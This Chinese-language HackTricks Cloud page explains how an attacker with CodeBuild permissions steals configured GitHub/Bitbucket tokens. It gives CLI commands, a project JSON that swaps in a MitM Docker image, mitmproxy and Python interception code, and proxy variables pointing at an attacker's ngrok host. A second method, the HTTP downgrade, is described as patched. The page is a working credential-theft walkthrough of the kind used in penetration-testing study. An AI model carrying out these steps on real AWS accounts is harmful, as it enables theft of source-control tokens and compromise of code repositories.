# AWS Codebuild - 令牌泄露

<details>

<summary><strong>支持 HackTricks 并获得福利！</strong></summary>

* 如果您想在 HackTricks 中看到您的公司广告，或者如果您想访问 PEASS 的最新版本或下载 PDF 版的 HackTricks，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS 和 HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享您的黑客技巧**。

</details>

## 恢复 Github/Bitbucket 配置的令牌

首先，检查是否配置了任何可能泄露的源凭据：
```bash
aws codebuild list-source-credentials
```
### 通过Docker镜像

如果您发现例如Github的身份验证已在帐户中设置，您可以通过使Codebuild使用特定的Docker镜像来运行项目的构建来**泄露**该**访问权限**（GH令牌或OAuth令牌）。

为此，您可以**创建一个新的Codebuild项目**或更改现有项目的**环境**以设置**Docker镜像**。

您可以使用的Docker镜像是[https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm)。这是一个非常基本的Docker镜像，将设置**环境变量`https_proxy`**，**`http_proxy`**和**`SSL_CERT_FILE`**。这将允许您拦截大部分在**`https_proxy`**和**`http_proxy`**中指定的主机的流量，并信任**`SSL_CERT_FILE`**中指定的SSL证书。

1. **创建并上传您自己的Docker MitM镜像**
* 按照存储库的说明设置代理IP地址并设置SSL证书，并**构建Docker镜像**。
* **不要设置`http_proxy`**以不拦截对元数据端点的请求。
* 您可以使用类似于`ngrok tcp 4444`的`ngrok`将代理设置为您的主机。
* 构建完成Docker镜像后，**将其上传到公共存储库**（Dockerhub，ECR...）。
2. **设置环境**
* 创建一个**新的Codebuild项目**或**修改**现有项目的环境。
* 设置项目使用**先前生成的Docker镜像**。
*

<figure><img src="../../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
3. **在您的主机中设置MitM代理**
* 如**Github存储库**中所示，您可以使用类似于以下内容的内容：
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
4. **运行构建并捕获凭据**

*   您可以在**Authorization**头中看到令牌：

<figure><img src="../../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

这也可以通过aws cli来完成，例如：
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
{% endcode %}

### 通过HTTP协议

{% hint style="success" %}
**这个漏洞在2023年2月20日的某个时间点被AWS修复了（我想是星期五）。所以攻击者不能再滥用它了 :)**
{% endhint %}

一个拥有**CodeBuild的高权限的攻击者可以泄露配置的Github/Bitbucket令牌**，或者如果权限是通过OAuth配置的，可以泄露**用于访问代码的临时OAuth令牌**。

* 攻击者可以将环境变量**http\_proxy**和**https\_proxy**添加到CodeBuild项目中，指向他的机器（例如`http://5.tcp.eu.ngrok.io:14972`）。

<figure><img src="../../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

* 然后，将github仓库的URL更改为使用HTTP而不是HTTPS，例如：**http://**github.com/carlospolop-forks/TestActions
* 然后，在代理变量（http\_proxy和https\_proxy）指向的端口上运行[https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm)的基本示例。
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
* 最后，点击**构建项目**，**凭证**将以明文（base64）发送到mitm端口：

<figure><img src="../../../../.gitbook/assets/image (1) (1) (6).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
现在攻击者将能够从他的机器上使用令牌，列出所有权限，并且比直接使用CodeBuild服务更容易地滥用。
{% endhint %}

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您想在HackTricks中看到您的**公司广告**，或者如果您想访问**PEASS的最新版本或下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧。**

</details>
